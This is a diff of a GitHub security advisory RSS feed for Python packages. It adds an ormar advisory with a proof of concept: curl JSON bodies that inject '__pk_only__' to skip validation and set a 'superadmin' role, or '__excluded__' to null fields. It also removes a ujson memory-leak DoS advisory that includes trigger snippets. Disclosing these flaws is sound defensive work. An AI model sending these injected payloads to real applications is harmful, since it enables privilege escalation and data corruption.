@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-03-19T16:15:36.627Z</updated>
+    <updated>2026-03-19T17:17:59.319Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,226 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[ormar] ormar Pydantic Validation Bypass via __pk_only__ and __excluded__ Kwargs Injection in Model Constructor]]></title>
+        <id>https://github.com/advisories/GHSA-f964-whrq-44h8</id>
+        <link href="https://github.com/advisories/GHSA-f964-whrq-44h8"/>
+        <updated>2026-03-19T16:27:43.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Pydantic validation bypass in <code>ormar</code>'s model constructor allows any unauthenticated user to skip <strong>all</strong> field validation — type checks, constraints, <code>@field_validator</code>/<code>@model_validator</code> decorators, choices enforcement, and required-field checks — by injecting <code>"__pk_only__": true</code> into a JSON request body. The unvalidated data is subsequently persisted to the database. This affects the <strong>canonical usage pattern</strong> recommended in ormar's official documentation and examples.</p>
+<p>A secondary <code>__excluded__</code> parameter injection uses the same design pattern to selectively nullify arbitrary model fields during construction.</p>
+<h3 id="details">Details</h3>
+<p><strong>Root cause:</strong> <code>NewBaseModel.__init__</code> (<a href="https://github.com/collerek/ormar/blob/master/ormar/models/newbasemodel.py#L128"><code>ormar/models/newbasemodel.py</code>, line 128</a>) pops <code>__pk_only__</code> directly from user-supplied <code>**kwargs</code> before any validation occurs:</p>
+<pre><code class="language-python"># ormar/models/newbasemodel.py, lines 128-142
+pk_only = kwargs.pop("__pk_only__", False)      # ← extracted from user kwargs
+object.__setattr__(self, "__pk_only__", pk_only)
+
+new_kwargs, through_tmp_dict = self._process_kwargs(kwargs)
+
+if not pk_only:
+    # Normal path: full Pydantic validation
+    new_kwargs = self.serialize_nested_models_json_fields(new_kwargs)
+    self.__pydantic_validator__.validate_python(
+        new_kwargs, self_instance=self
+    )
+else:
+    # Bypass path: NO validation at all
+    fields_set = {self.ormar_config.pkname}
+    values = new_kwargs
+    object.__setattr__(self, "__dict__", values)       # raw dict written directly
+    object.__setattr__(self, "__pydantic_fields_set__", fields_set)
+</code></pre>
+<p>The <code>__pk_only__</code> flag was designed as an internal optimization for creating lightweight FK placeholder instances in <a href="https://github.com/collerek/ormar/blob/master/ormar/fields/foreign_key.py#L41"><code>ormar/fields/foreign_key.py</code> (lines 41, 527)</a>. However, because it is extracted from <code>**kwargs</code> via <code>.pop()</code> with a <code>False</code> default, any external caller that passes user-controlled data to the model constructor can inject this flag.</p>
+<p><strong>Why the canonical FastAPI + ormar pattern is vulnerable:</strong></p>
+<p>Ormar's official example (<a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py#L55"><code>examples/fastapi_quick_start.py</code>, lines 55-58</a>) recommends using ormar models directly as FastAPI request body parameters:</p>
+<pre><code class="language-python">@app.post("/items/", response_model=Item)
+async def create_item(item: Item):
+    await item.save()
+    return item
+</code></pre>
+<p>FastAPI parses the JSON body and calls <code>TypeAdapter.validate_python(body_dict)</code>, which triggers ormar's <code>__init__</code>. The <code>__pk_only__</code> key is popped at line 128 <strong>before</strong> Pydantic's validator inspects the data, so Pydantic never sees it — even <code>extra='forbid'</code> would not prevent this, because the key is already consumed by ormar.</p>
+<p>The ormar Pydantic <code>model_config</code> (set in <a href="https://github.com/collerek/ormar/blob/master/ormar/models/helpers/pydantic.py#L108"><code>ormar/models/helpers/pydantic.py</code>, line 108</a>) does not set <code>extra='forbid'</code>, providing no protection even in theory.</p>
+<p><strong>What is bypassed when <code>__pk_only__=True</code>:</strong></p>
+<ul>
+<li>All type coercion and type checking (e.g., string for int field)</li>
+<li><code>max_length</code> constraints on String fields</li>
+<li><code>choices</code> constraints</li>
+<li>All <code>@field_validator</code> and <code>@model_validator</code> decorators</li>
+<li><code>nullable=False</code> enforcement at the Pydantic level</li>
+<li>Required-field enforcement (only <code>pkname</code> is put in <code>fields_set</code>)</li>
+<li><code>serialize_nested_models_json_fields()</code> preprocessing</li>
+</ul>
+<p><strong>Save path persists unvalidated data to the database:</strong></p>
+<p>After construction with <code>pk_only=True</code>, calling <code>.save()</code> (<a href="https://github.com/collerek/ormar/blob/master/ormar/models/model.py#L89"><code>ormar/models/model.py</code>, lines 89-107</a>) reads fields directly from <code>self.__dict__</code> via <code>_extract_model_db_fields()</code>, then executes <code>table.insert().values(**self_fields)</code> — persisting the unvalidated data to the database with no re-validation.</p>
+<p><strong>Secondary vulnerability — <code>__excluded__</code> injection:</strong></p>
+<p>The same pattern applies to <code>__excluded__</code> at <a href="https://github.com/collerek/ormar/blob/master/ormar/models/newbasemodel.py#L292"><code>ormar/models/newbasemodel.py</code>, line 292</a>:</p>
+<pre><code class="language-python">excluded: set[str] = kwargs.pop("__excluded__", set())
+</code></pre>
+<p>At lines 326-329, fields listed in <code>__excluded__</code> are silently set to <code>None</code>:</p>
+<pre><code class="language-python">for field_to_nullify in excluded:
+    new_kwargs[field_to_nullify] = None
+</code></pre>
+<p>An attacker can inject <code>"__excluded__": ["email", "password_hash"]</code> to nullify arbitrary fields during construction.</p>
+<p><strong>Affected entry points:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Entry Point</th>
+<th>Exploitable?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>async def create_item(item: Item)</code> (FastAPI route)</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>Model.objects.create(**user_dict)</code></td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>Model(**user_dict)</code></td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>Model.model_validate(user_dict)</code></td>
+<td>Yes</td>
+</tr>
+</tbody></table>
+<h3 id="poc">PoC</h3>
+<p><strong>Step 1: Create a FastAPI + ormar application using the canonical pattern from ormar's docs:</strong></p>
+<pre><code class="language-python"># app.py
+from contextlib import asynccontextmanager
+import sqlalchemy
+import uvicorn
+from fastapi import FastAPI
+import ormar
+
+DATABASE_URL = "sqlite+aiosqlite:///test.db"
+ormar_base_config = ormar.OrmarConfig(
+    database=ormar.DatabaseConnection(DATABASE_URL),
+    metadata=sqlalchemy.MetaData(),
+)
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    database_ = app.state.database
+    if not database_.is_connected:
+        await database_.connect()
+    # Create tables
+    engine = sqlalchemy.create_engine(DATABASE_URL.replace("+aiosqlite", ""))
+    ormar_base_config.metadata.create_all(engine)
+    engine.dispose()
+    yield
+    database_ = app.state.database
+    if database_.is_connected:
+        await database_.disconnect()
+
+app = FastAPI(lifespan=lifespan)
+database = ormar.DatabaseConnection(DATABASE_URL)
+app.state.database = database
+
+class User(ormar.Model):
+    ormar_config = ormar_base_config.copy(tablename="users")
+
+    id: int = ormar.Integer(primary_key=True)
+    name: str = ormar.String(max_length=50)
+    email: str = ormar.String(max_length=100)
+    role: str = ormar.String(max_length=20, default="user")
+    balance: int = ormar.Integer(default=0)
+
+# Canonical ormar pattern from official examples
+@app.post("/users/", response_model=User)
+async def create_user(user: User):
+    await user.save()
+    return user
+
+if __name__ == "__main__":
+    uvicorn.run(app, host="127.0.0.1", port=8000)
+</code></pre>
+<p><strong>Step 2: Send a normal request (validation works correctly):</strong></p>
+<pre><code class="language-bash"># This correctly rejects — "name" exceeds max_length=50
+curl -X POST http://127.0.0.1:8000/users/ \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "email": "user@example.com"
+  }'
+# Returns: 422 Validation Error
+</code></pre>
+<p><strong>Step 3: Inject <code>__pk_only__</code> to bypass ALL validation:</strong></p>
+<pre><code class="language-bash">curl -X POST http://127.0.0.1:8000/users/ \
+  -H "Content-Type: application/json" \
+  -d '{
+    "__pk_only__": true,
+    "name": "",
+    "email": "not-an-email",
+    "role": "superadmin",
+    "balance": -99999
+  }'
+# Returns: 200 OK — all fields persisted to database WITHOUT validation
+# - "name" is empty despite being required
+# - "email" is not a valid email
+# - "role" is "superadmin" (bypassing any validator that restricts to "user"/"admin")
+# - "balance" is negative (bypassing any ge=0 constraint)
+</code></pre>
+<p><strong>Step 4: Inject <code>__excluded__</code> to nullify arbitrary fields:</strong></p>
+<pre><code class="language-bash">curl -X POST http://127.0.0.1:8000/users/ \
+  -H "Content-Type: application/json" \
+  -d '{
+    "__excluded__": ["email", "role"],
+    "name": "attacker",
+    "email": "will-be-nullified@example.com",
+    "role": "will-be-nullified"
+  }'
+# Returns: 200 OK — email and role are set to NULL regardless of input
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p><strong>Who is impacted:</strong> Every application using ormar's canonical FastAPI integration pattern (<code>async def endpoint(item: OrmarModel)</code>) is vulnerable. This is the primary usage pattern documented in ormar's official examples and documentation.</p>
+<p><strong>Vulnerability type:</strong> Complete Pydantic validation bypass.</p>
+<p><strong>Impact scenarios:</strong></p>
+<ul>
+<li><strong>Privilege escalation</strong>: If a model has a <code>role</code> or <code>is_admin</code> field with a Pydantic validator restricting values to <code>"user"</code>, an attacker can set <code>role="superadmin"</code> by bypassing the validator</li>
+<li><strong>Data integrity violation</strong>: Type constraints (<code>max_length</code>, <code>ge</code>/<code>le</code>, regex patterns) are all bypassed — invalid data is persisted to the database</li>
+<li><strong>Business logic bypass</strong>: Custom <code>@field_validator</code> and <code>@model_validator</code> decorators (e.g., enforcing email format, age ranges, cross-field dependencies) are entirely skipped</li>
+<li><strong>Field nullification</strong> (via <code>__excluded__</code>): Audit fields, tracking fields, or required business fields can be selectively set to NULL</li>
+</ul>
+<p><strong>Suggested fix:</strong></p>
+<p>Replace <code>kwargs.pop("__pk_only__", False)</code> with a keyword-only parameter that cannot be injected via <code>**kwargs</code>:</p>
+<pre><code class="language-python"># Before (vulnerable)
+def __init__(self, *args: Any, **kwargs: Any) -&gt; None:
+    ...
+    pk_only = kwargs.pop("__pk_only__", False)
+
+# After (secure)
+def __init__(self, *args: Any, _pk_only: bool = False, **kwargs: Any) -&gt; None:
+    ...
+    object.__setattr__(self, "__pk_only__", _pk_only)
+</code></pre>
+<p>Apply the same fix to <code>__excluded__</code>:</p>
+<pre><code class="language-python"># Before (vulnerable)
+excluded: set[str] = kwargs.pop("__excluded__", set())
+
+# After (secure) — pass via keyword-only _excluded parameter
+def __init__(self, *args: Any, _pk_only: bool = False, _excluded: set | None = None, **kwargs: Any) -&gt; None:
+    ...
+    # In _process_kwargs:
+    excludes = _excluded or set()
+</code></pre>
+<p>Internal callers in <code>foreign_key.py</code> would pass <code>_pk_only=True</code> as a named argument. Keyword-only parameters prefixed with <code>_</code> cannot be injected via JSON body deserialization or <code>Model(**user_dict)</code> unpacking.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ormar-orm/ormar/security/advisories/GHSA-f964-whrq-44h8">https://github.com/ormar-orm/ormar/security/advisories/GHSA-f964-whrq-44h8</a></li>
+<li><a href="https://github.com/advisories/GHSA-f964-whrq-44h8">https://github.com/advisories/GHSA-f964-whrq-44h8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f964-whrq-44h8</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-19T16:27:43.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[nltk] NLTK has a Downloader Path Traversal Vulnerability (AFO) - Arbitrary File Overwrite]]></title>
         <id>https://github.com/advisories/GHSA-469j-vmhf-r6v7</id>
@@ -1119,40 +1339,5 @@ example(1000, -200)  # infinite loop
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-03-18T13:01:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[ujson] UltraJSON has a Memory Leak parsing large integers allows DoS ]]></title>
-        <id>https://github.com/advisories/GHSA-wgvc-ghv9-3pmm</id>
-        <link href="https://github.com/advisories/GHSA-wgvc-ghv9-3pmm"/>
-        <updated>2026-03-18T13:01:16.000Z</updated>
-        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
-<p>ujson 5.4.0 to 5.11.0 inclusive contain an accumulating memory leak in JSON parsing <em>large</em> (outside of the range [-2^63, 2^64 - 1]) integers.</p>
-<h4 id="exploitability">Exploitability</h4>
-<p>Any service that calls <code>ujson.load()</code>/<code>ujson.loads()</code>/<code>ujson.decode()</code> on untrusted inputs is affected and vulnerable to denial of service attacks.</p>
-<h4 id="details">Details</h4>
-<p>The leaked memory is a copy of the string form of the integer plus an additional NULL byte. The leak occurs irrespective of whether the integer parses successfully or is rejected due to having more than <code>sys.get_int_max_str_digits()</code> digits, meaning that any sized leak per malicious JSON can be achieved provided that there is no limit on the overall size of the payload.</p>
-<pre><code class="language-python">ujson.loads(str(2 ** 64 - 1))  # No leak
-ujson.loads(str(2 ** 64))  # Leaks
-ujson.loads(str(10 ** sys.get_int_max_str_digits()))  # Leaks and raises ValueError
-</code></pre>
-<h4 id="fix">Fix</h4>
-<p>The leak is fixed in <code>ujson 5.12.0</code> (4baeb950df780092bd3c89fc702a868e99a3a1d2). There are no workarounds beyond upgrading to an unaffected version.</p>
-<h4 id="credits">Credits</h4>
-<p>Discovered by Cameron Criswell/Skevros using Coverage-guided fuzzing (libFuzzer + AddressSanitizer)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/ultrajson/ultrajson/security/advisories/GHSA-wgvc-ghv9-3pmm">https://github.com/ultrajson/ultrajson/security/advisories/GHSA-wgvc-ghv9-3pmm</a></li>
-<li><a href="https://github.com/ultrajson/ultrajson/commit/4baeb950df780092bd3c89fc702a868e99a3a1d2">https://github.com/ultrajson/ultrajson/commit/4baeb950df780092bd3c89fc702a868e99a3a1d2</a></li>
-<li><a href="https://github.com/ultrajson/ultrajson/releases/tag/5.12.0">https://github.com/ultrajson/ultrajson/releases/tag/5.12.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-wgvc-ghv9-3pmm">https://github.com/advisories/GHSA-wgvc-ghv9-3pmm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wgvc-ghv9-3pmm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-18T13:01:15.000Z</published>
     </entry>
 </feed>
